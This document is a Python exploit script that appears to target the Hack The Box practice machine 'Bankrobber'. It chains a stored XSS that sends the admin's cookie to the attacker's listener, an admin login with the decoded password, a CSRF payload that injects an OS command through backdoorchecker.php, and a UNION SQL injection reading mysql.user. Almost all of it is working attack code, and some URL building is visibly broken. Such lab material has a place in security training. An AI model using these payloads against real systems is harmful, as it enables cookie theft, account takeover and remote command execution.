import sys
import threading
import requests
import argparse
import base64
import urllib.parse
from http.server import BaseHTTPRequestHandler, HTTPServer

parser = argparse.ArgumentParser(description='XSS => SQi => RCE (Bankrobber hackthebox)')

parser.add_argument("--targetIp", default="10.10.10.154", type=str, help="Bankrobber ip address")
parser.add_argument("--localIp", default="10.10.14.24", type=str, help="Your IP address")
args = parser.parse_args()
session = requests.Session()


def url_encode(str):
    return urllib.parse.quote(str)


def url_decode(str):
    return urllib.parse.unquote(str)


def use_command(name):
    print("Command " + name + " called !")
    try:
        if name == 'xss':
            t = threading.Thread(target=send_xss, args=())
            t.start()

        if name == 'sqli':
            t = threading.Thread(target=send_sqli, args=())
            t.start()

        if name == 'xsrf':
            t = threading.Thread(target=send_xsrf, args=())
            t.start()

    except:
        sys.exit(0)


def send_xsrf():
    transfer_data = {
        "fromId": 3,
        "toId": 1,
        "amount": 1,
        "comment": "<script>const req = new XMLHttpRequest();const params = 'cmd=dir | ping " + args.localIp + "';req.open('POST', 'http://localhost/admin/backdoorchecker.php', true);req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');req.send(params);</script>",
    }

    tr_response = session.post("http://" + args.targetIp + "user/transfer.php", data=transfer_data)
    print(str(tr_response.status_code) + "; XSRF send, waiting for response cookie..")


def send_sqli():
    search_res = session.post("http://" + args.targetIp + "admin/search.php",
                              data={"term": "1' UNION SELECT user,password,3 from mysql.user;-- -"})


def send_xss():
    print("Sending the xss..")
    global session

    login_data = {
        "username": "hacker",
        "password": "hacker",
        "pounds": "Submit Query"
    }

    session.post(args.targetIp + "login.php", data=login_data)
    is_logged = session.get(args.targetIp + "user/")
    if "You're not authorized" in is_logged.text:
        raise Exception("Your are not logged into bankrobber")

    transfer_data = {
        "fromId": 3,
        "toId": 1,
        "amount": 1,
        "comment": '<script>new Image().src="http://' + args.localIp + '/cookie?c="+btoa(document.cookie);</script>',
    }

    tr_response = session.post("http://" + args.targetIp + "user/transfer.php", data=transfer_data)
    print(str(tr_response.status_code) + "; XSS send, waiting for response cookie..")


class MyServer(HTTPServer):
    def server_activate(self):
        use_command('xss')
        HTTPServer.server_activate(self)


class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def log_request(self, *argus, **kwargs):
        return

    def log_message(self, *argus, **kwargs):
        return

    def do_GET(self):
        print("GET " + self.path)

        cookie = base64.b64decode(self.path.split("=")[1] + "==").decode('utf8', errors='ignore')
        password = url_decode(cookie.split(";")[1].split("=")[1])

        login_data = {
            "username": "admin",
            "password": base64.b64decode(password).decode('utf8', errors='ignore'),
            "pounds": "Submit Query"
        }

        is_logged = session.post("http://" + args.targetIp + "login.php", data=login_data)

        if "You're not authorized" in is_logged.text:
            raise Exception("Your are not logged as admin into bankrobber")

        print("Authenticated as admin !")

        # use_command("sqli")
        use_command("xsrf")

        self.send_error(404)


def main():
    # Fake server behaviour
    handler = SimpleHTTPRequestHandler
    handler.server_version = 'nginx'
    handler.sys_version = ''
    handler.error_message_format = 'not found'

    httpd = MyServer(('0.0.0.0', 80), handler)

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()


main()
